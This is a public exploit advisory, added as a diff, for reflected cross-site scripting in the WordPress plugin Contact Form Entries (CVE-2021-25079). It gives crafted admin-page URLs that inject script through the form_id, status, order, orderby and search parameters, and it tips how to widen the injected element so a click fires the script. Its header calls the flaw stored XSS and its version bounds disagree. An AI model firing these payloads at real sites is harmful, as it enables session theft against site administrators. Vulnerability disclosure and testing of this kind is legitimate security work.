@@ -1,0 +1,74 @@
+id: 37215
+date: 01/10/2022
+title: WordPress Contact Form Entries Cross Site Scripting Vulnerability
+author: gx1
+cves: CVE-2021-25079
+
+# Exploit Title: Contact Form Entries < 1.1.7 - Unauthenticated Stored Cross-Site Scripting. 
+# Exploit Author: gx1  <gaetano.perrone[at]secsi.io>
+# Vulnerability Discovery: Gaetano Perrone (aka gx1)
+# Vendor Homepage:   https://www.crmperks.com/
+# Software Link:    https://wordpress.org/plugins/contact-form-entries/
+# Version: < 1.2.4
+# Tested on: any
+# CVE :  CVE-2021-25079
+
+
+
+# References: 
+* https://wpscan.com/vulnerability/c3d49271-9656-4428-8357-0d1d77b7fc63
+* https://secsi.io/blog/cve-2021-25079-multiple-reflected-xss-in-contact-form-entries-plugin/
+
+# Description: 
+Several params of vxcf_leads administrator page are vulnerable to a Reflected Cross-Site-Scripting vulnerability.
+
+
+
+
+
+# Proof Of Concept: 
+
+The following request:
+---------------------------------------------------------------------------------------------------------------------------------------
+
+GET /wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status&tab=entries&search&order=desc&orderby=fir+GET /wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status&tab=entries&search&order=desc&orderby=fir+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+returns the list of saved entries in the database.
+form_id value is reflected in <input> tag. 
+form_id parameter is not sanitized, so it is possible to inject arbitrary values.
+
+The following request:
+
+---------------------------------------------------------------------------------------------------------------------------------------
+http://example.com/wp-admin/admin.php?page=vxcf_leads&form_id=cf_5e1kpc%22+onmouseover%3Dalert%281%29+ne97l&status&tab=entries&search&order=desc&orderby=fir+ 
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Allows to inject onmouseover inside the input form. 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<input class="hide-column-tog" name="cf_5e1kpc\" onmouseover=alert(1) ne97l-vxvx-vxurl-hide" type="checkbox" id="cf_5e1kpc\" onmouseover=alert(1) ne97l-vxvx-vxurl-hide" value="cf_5e1kpc\" onmouseover=alert(1) ne97l-vxvx-vxurl" checked='checked' />Source</label><label>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+By moving the mouse inside the click element, the vulnerability is triggered. Even if the vulnerability seems to require the user to move the mouse on the input element, it is possible to improve the attack by just injecting a “style” section that expands the input element with large width and height. In this way, when the user clicks on the link, javascript code is executed. 
+
+status param is vulnerable to most dangerous XSS attack: just sending the following request  
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+http://example.com/wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status=b9zrb--%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3Eg482f&tab=entries&search&order=asc&orderby=file-438&field&time&start_date&end_date   
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+will execute XSS vulnerability.  
+
+order, orderby and search parameters are also vulnerable to XSS:
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+http://example.com/wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status&tab=entries&search&order=desc&orderby=fir%20ihj17%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fv9tdt
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+# Solution: 
+Upgrade Contact Form Entries to version 1.2.4
+
+#  0day.today [2023-03-23]  #
